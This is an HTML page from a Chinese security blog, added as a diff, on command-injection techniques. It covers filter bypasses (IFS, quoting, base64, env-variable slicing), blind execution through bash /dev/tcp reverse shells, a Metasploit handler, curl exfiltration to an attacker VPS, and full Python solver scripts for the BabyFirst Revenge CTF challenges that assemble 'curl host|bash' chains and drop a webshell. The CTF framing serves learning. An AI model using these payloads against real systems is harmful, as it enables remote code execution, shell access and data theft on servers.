@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    命令执行 | 道萝岗特森&#39;s Blog
+  </title>
+  <meta name="description" content="hello world">
+  
+  <meta name="keywords" content="
+  技术总结,命令执行
+  ">
+  
+  <meta name="author" content="daolgts">
+
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+<script>
+  var _hmt = _hmt || [];
+  (function(){var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
+    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
+</script>
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+</head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">This website</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        <!--  -->
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+          <li><a href="/links">Links</a></li>
+        
+        
+          <li><a href="/about">About</a></li>
+        
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 34 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 15 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 0 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">道萝岗特森&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    daolgts
+
+    <span class="post-date float-right" title="{{moment(1520152835000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1520152835000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>命令执行</h1>
+    <h2 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1. 空格绕过"></a>1. 空格绕过</h2><ol>
+<li>重定向符&lt;</li>
+<li>%09(php环境)</li>
+<li>$IFS$9  或 ${IFS} 符号<br>这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，然而我本地实验却会发生这种情况，这里解释一下,单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</li>
+</ol>
+<h2 id="2-命令分隔符"><a href="#2-命令分隔符" class="headerlink" title="2. 命令分隔符"></a>2. 命令分隔符</h2><ol>
+<li>%0a符号<br>换行符</li>
+<li>%0d符号<br>回车符</li>
+<li>;符号<br>在 shell 中，担任”连续指令”功能的符号就是”分号”</li>
+<li>&amp;符号<br>表示任务在后台执行</li>
+<li>&amp;&amp;<br>表示前一条命令执行成功时，才执行后一条命令</li>
+<li>|符号<br>管道符左边命令的输出就会作为管道符右边命令的输入</li>
+<li>||符号<br>表示上一条命令执行失败后，才执行下一条命令</li>
+</ol>
+<h2 id="3-命令终止符"><a href="#3-命令终止符" class="headerlink" title="3. 命令终止符"></a>3. 命令终止符</h2><ol>
+<li>%00</li>
+<li>%20#</li>
+</ol>
+<h2 id="4-黑名单绕过"><a href="#4-黑名单绕过" class="headerlink" title="4. 黑名单绕过"></a>4. 黑名单绕过</h2><ol>
+<li>拼接<br>a=l;b=s;$a$b</li>
+<li>base64编码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@test:/home/test# `echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`   //反引号</span><br><span class="line">flagaaaaaaaaaa</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@test:/home/test# echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash    // |连接</span><br><span class="line">flagaaaaaaaaaa</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>利用系统环境变量<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@test:/home/test# echo $&#123;SHELLOPTS&#125;</span><br><span class="line">braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@test:/home/test# $&#123;SHELLOPTS:3:1&#125;$&#123;SHELLOPTS:2:1&#125;$&#123;SHELLOPTS:29:1&#125; flag</span><br><span class="line">flagaaaaaaaaaa</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>单/双引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@test:/home/test# ca&quot;&quot;t fl&quot;&quot;ag</span><br><span class="line">flagaaaaaaaaaa</span><br><span class="line">root@test:/home/test# ca&quot;&quot;t fl&apos;&apos;ag</span><br><span class="line">flagaaaaaaaaaa</span><br><span class="line">root@test:/home/test# ca&apos;&apos;t fl&apos;&apos;ag</span><br><span class="line">flagaaaaaaaaaa</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>反斜杠\</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@test:/home/test# ca\t fla\g</span><br><span class="line">flagaaaaaaaaaa</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="5-无回显命令执行"><a href="#5-无回显命令执行" class="headerlink" title="5. 无回显命令执行"></a>5. 无回显命令执行</h2><ol>
+<li>第一种是利用bash命令并在本地进行nc监听结果查看回连日志，然后就行<br>先在vps处用nc进行监听<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 8080 -vvv</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>然后在靶机命令执行处输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>第二种是msf反向回连<br>同样vps用msf监听<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vps的msf监听：</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/armle/shell/reverse_tcp</span><br><span class="line">set lport 8080</span><br><span class="line">set lhost xxx.xxx.xxx.xxx</span><br><span class="line">set exitonsession false</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>然后在靶机命令执行处输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>curl<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|curl vps的ip:8080/?a=`ls |head -n 3|tail -n 1`</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="6-限制长度的命令执行"><a href="#6-限制长度的命令执行" class="headerlink" title="6. 限制长度的命令执行"></a>6. 限制长度的命令执行</h2><ol>
+<li>linux下创建文件的命令可以用1&gt;1创建文件名为1的空文件<br>a&gt;1也可以，虽然会报错，但是还是可以创建空文件。</li>
+<li>ls&gt;1可以直接把把ls的内容导入一个文件中,但是会默认追加\n</li>
+</ol>
+<h4 id="常见php命令注入函数："><a href="#常见php命令注入函数：" class="headerlink" title="常见php命令注入函数："></a>常见php命令注入函数：</h4><p>eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellcmd()，popen()，proc_open()，pcntl_exec()</p>
+<h4 id="命令注入中有讲究的字符"><a href="#命令注入中有讲究的字符" class="headerlink" title="命令注入中有讲究的字符"></a>命令注入中有讲究的字符</h4><p>‘$’<br>‘;’<br>‘|’<br>‘-‘<br>‘(‘<br>‘)’<br>‘反引号’<br>‘||’<br>‘&amp;&amp;’<br>‘&amp;’<br>‘}’<br>‘{‘</p>
+<h2 id="BabyFirst-Revenge"><a href="#BabyFirst-Revenge" class="headerlink" title="BabyFirst Revenge"></a>BabyFirst Revenge</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $sandbox = &apos;/www/sandbox/&apos; . md5(&quot;orange&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&apos;cmd&apos;]) &amp;&amp; strlen($_GET[&apos;cmd&apos;]) &lt;= 5) &#123;</span><br><span class="line">        @exec($_GET[&apos;cmd&apos;]);</span><br><span class="line">    &#125; else if (isset($_GET[&apos;reset&apos;])) &#123;</span><br><span class="line">        @exec(&apos;/bin/rm -rf &apos; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>几个铺垫技巧</p>
+</li>
+<li><ol>
+<li>命令过长可以通过\进行换行续写</li>
+<li>文件种当前命令错误不影响之后命令的执行</li>
+<li>IP的等价表示法：IP地址本质上就是一个整数，只是通常用点分十进制表示，也可以用十六进制、长整数、八进制表示IP</li>
+<li>‘&gt;g’两个字符创建文件</li>
+</ol>
+</li>
+<li><p>思路：通过写入一系列指令的分段，并用反斜杠\作为文件结尾，最后执行ls -t&gt;g并且sh g来执行我们想要的指令</p>
+</li>
+</ul>
+<ol>
+<li><p>思路一：下载php马getshell<br> 将 ‘curl ip &gt; A’用续行方式切割成多行写进文件 A (即A的内容为’curl ip &gt; A’)，然后执行 sh A 就可以下载到预先放在公网主机上的文件并且<strong>覆盖</strong>本地的文件A，而下载下来的文件内容是用来写PHP木马的PHP代码，我再执行 php A就可以写个自己的webshell进去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">import requests as r</span><br><span class="line">import hashlib</span><br><span class="line">url = &apos;http://52.199.204.34/&apos;</span><br><span class="line"># 查询自己的IP</span><br><span class="line">ip = r.get(&apos;http://ipv4.icanhazip.com/&apos;).text.strip()</span><br><span class="line">sandbox = url + &apos;sandbox/&apos; + hashlib.md5(&apos;orange&apos; + ip).hexdigest() + &apos;/&apos;</span><br><span class="line"></span><br><span class="line">reset = url + &apos;?reset&apos;</span><br><span class="line">cmd = url + &apos;?cmd=&apos;</span><br><span class="line">build = [&apos;&gt;cur\&apos;,</span><br><span class="line">         &apos;&gt;l \&apos;,</span><br><span class="line">         &apos;ls&gt;A&apos;,</span><br><span class="line">         &apos;rm c*&apos;,</span><br><span class="line">         &apos;rm l*&apos;,</span><br><span class="line">         &apos;&gt;105\&apos;,</span><br><span class="line">         &apos;&gt;304\&apos;,</span><br><span class="line">         &apos;&gt;301\&apos;,</span><br><span class="line">         &apos;&gt;9&gt;\&apos;,</span><br><span class="line">         &apos;ls&gt;&gt;A&apos;,</span><br><span class="line">         &apos;sh A&apos;,</span><br><span class="line">         &apos;php A&apos;</span><br><span class="line">         ]</span><br><span class="line"># 如果目标服务器有GET，这个也是可以打的</span><br><span class="line"># build = [&apos;&gt;GE\&apos;,</span><br><span class="line">#          &apos;&gt;T\ \&apos;,</span><br><span class="line">#          &apos;ls&gt;A&apos;,</span><br><span class="line">#          &apos;rm G*&apos;,</span><br><span class="line">#          &apos;rm T*&apos;,</span><br><span class="line">#          &apos;&gt;105\&apos;,</span><br><span class="line">#          &apos;&gt;304\&apos;,</span><br><span class="line">#          &apos;&gt;301\&apos;,</span><br><span class="line">#          &apos;&gt;9&gt;\&apos;,</span><br><span class="line">#          &apos;ls&gt;&gt;A&apos;]</span><br><span class="line">r.get(reset)</span><br><span class="line">for i in build:</span><br><span class="line">    s = r.get(cmd + i)</span><br><span class="line">    print &apos;[%s]&apos; % s.status_code, s.url</span><br><span class="line"></span><br><span class="line">s = r.get(sandbox + &apos;fun.php?cmd=uname -a&apos;)</span><br><span class="line">print &apos;n&apos; + &apos;[%s]&apos; % s.status_code, s.url</span><br><span class="line">print s.text</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>思路二：bash反弹shell<br> 先写入ls -t&gt;g到A中,然后分段写入’curl ‘vps的ip’|bash’，（在本机监听7777端口）vps的内容为bash -i &gt;&amp; /dev/tcp/10.188.2.20/777 0&gt;&amp;1，然后sh A（生成g文件，内容为curl ‘vps的ip’|bash），最后sh g</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib import quote</span><br><span class="line">payload = [</span><br><span class="line">    # generate `ls -t&gt;g` file</span><br><span class="line">    &apos;&gt;ls\\&apos;,</span><br><span class="line">    &apos;ls&gt;_&apos;,</span><br><span class="line">    &apos;&gt;\ \\&apos;,</span><br><span class="line">    &apos;&gt;-t\\&apos;,</span><br><span class="line">    &apos;&gt;\&gt;g&apos;,</span><br><span class="line">    &apos;ls&gt;&gt;_&apos;,</span><br><span class="line">    # generate `curl orange.tw.tw|python`  反弹shell</span><br><span class="line">    # generate `curl 10.188.2.20|bash`  反弹shell</span><br><span class="line">    &apos;&gt;sh\ &apos;,</span><br><span class="line">    &apos;&gt;ba\\&apos;,</span><br><span class="line">    &apos;&gt;\|\\&apos;,</span><br><span class="line">    &apos;&gt;20\\&apos;,</span><br><span class="line">    &apos;&gt;2.\\&apos;,</span><br><span class="line">    &apos;&gt;8.\\&apos;,</span><br><span class="line">    &apos;&gt;18\\&apos;,</span><br><span class="line">    &apos;&gt;0.\\&apos;,</span><br><span class="line">    &apos;&gt;1\\&apos;,</span><br><span class="line">    &apos;&gt;\ \\&apos;,</span><br><span class="line">    &apos;&gt;rl\\&apos;,</span><br><span class="line">    &apos;&gt;cu\\&apos;,</span><br><span class="line">    # exec</span><br><span class="line">    &apos;sh _&apos;,</span><br><span class="line">    &apos;sh g&apos;,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">r = requests.get(&apos;http://10.188.2.20:22460/?reset=1&apos;)</span><br><span class="line">for i in payload:</span><br><span class="line">    assert len(i) &lt;= 5</span><br><span class="line">    r = requests.get(&apos;http://10.188.2.20:22460/?cmd=&apos; + quote(i) )</span><br><span class="line">    print i</span><br><span class="line">    sleep(0.2)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>ps:不知道为什么我的ls命令排序和writeup显示的不一样，选用文件名的时候要注意排序</p>
+<h2 id="babyfirst-revenge-v2"><a href="#babyfirst-revenge-v2" class="headerlink" title="babyfirst-revenge-v2"></a>babyfirst-revenge-v2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $sandbox = &apos;/www/sandbox/&apos; . md5(&quot;orange&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&apos;cmd&apos;]) &amp;&amp; strlen($_GET[&apos;cmd&apos;]) &lt;= 4) &#123;</span><br><span class="line">        @exec($_GET[&apos;cmd&apos;]);</span><br><span class="line">    &#125; else if (isset($_GET[&apos;reset&apos;])) &#123;</span><br><span class="line">        @exec(&apos;/bin/rm -rf &apos; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>由于字符限制在了4个,所以不能再像之前那样通过分割字符来实现.原因是不管如何对<code>ls -t&gt;g</code>这个命令进行何种切割,<code>&gt;\&gt;\</code>和<code>&gt;\ \</code>是必然作为单独的部分,这样由于ls按照文件名进行排序,所以虽然可以呈现<code>space\ -t\ &gt;\ ? ls</code>,但是<code>ls&gt;&gt;?</code>这个是没有办法实现的.</p>
+</li>
+<li><p>通过rev逆序之后解决.其中<code>ls -t&gt;g</code>这个命令不能逆序,由于t是比s大的，如果逆序s不会在t的前面,所以这里使用<code>ls -th&gt;g.</code></p>
+</li>
+<li><p>关于<code>*</code>命令:<br><code>*</code> 相当于<code>$(dir *)</code>,所以说如果文件名如果是命令的话就会返回执行的结果,之后的作为参数传入.所以这样如果dir在最前面的话,就可以把当前目录的文件都返回.</p>
+</li>
+<li><p>之后将<code>*</code>的结果写入文件中,紧接着写入rev文件.</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;*&gt;v</span><br><span class="line">&gt;rev</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最后执行rev v&gt;u,这个命令需要通过*命令的其它形式实现.<br><code>*v&gt;u</code>这个命令就是<code>rev v&gt;u</code>,因为<code>*v</code>恰好是可以匹配到<code>rev</code>和<code>v</code>的,如果文件名换成其它字母会因为排序错误或者没有作为rev的参数而逆序失败.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib import quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    # generate &quot;g&gt; ht- sl&quot; to file &quot;v&quot;</span><br><span class="line">    &apos;&gt;dir&apos;,</span><br><span class="line">    &apos;&gt;sl&apos;,</span><br><span class="line">    &apos;&gt;g\&gt;&apos;,</span><br><span class="line">    &apos;&gt;ht-&apos;,</span><br><span class="line">    &apos;*&gt;v&apos;,</span><br><span class="line"></span><br><span class="line">    # reverse file &quot;v&quot; to file &quot;x&quot;, content &quot;ls -th &gt;g&quot;</span><br><span class="line">    &apos;&gt;rev&apos;,</span><br><span class="line">    &apos;*v&gt;x&apos;,</span><br><span class="line"></span><br><span class="line">    # generate &quot;curl orange.tw|python;&quot;</span><br><span class="line">    &apos;&gt;\;\\&apos;,</span><br><span class="line">    &apos;&gt;on\\&apos;,</span><br><span class="line">    &apos;&gt;th\\&apos;,</span><br><span class="line">    &apos;&gt;py\\&apos;,</span><br><span class="line">    &apos;&gt;\|\\&apos;,</span><br><span class="line">    &apos;&gt;tw\\&apos;,</span><br><span class="line">    &apos;&gt;e.\\&apos;,</span><br><span class="line">    &apos;&gt;ng\\&apos;,</span><br><span class="line">    &apos;&gt;ra\\&apos;,</span><br><span class="line">    &apos;&gt;o\\&apos;,</span><br><span class="line">    &apos;&gt;\ \\&apos;,</span><br><span class="line">    &apos;&gt;rl\\&apos;,</span><br><span class="line">    &apos;&gt;cu\\&apos;,</span><br><span class="line"></span><br><span class="line">    # got shell</span><br><span class="line">    &apos;sh x&apos;,</span><br><span class="line">    &apos;sh g&apos;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(&apos;http://52.197.41.31/?reset=1&apos;)</span><br><span class="line">for i in payload:</span><br><span class="line">    assert len(i) &lt;= 4</span><br><span class="line">    r = requests.get(&apos;http://52.197.41.31/?cmd=&apos; + quote(i) )</span><br><span class="line">    print i</span><br><span class="line">sleep(0.1)</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="https://daolgts.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 daolgts</li>
+      <li><a href="https://daolgts.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/daolgts">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
+      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
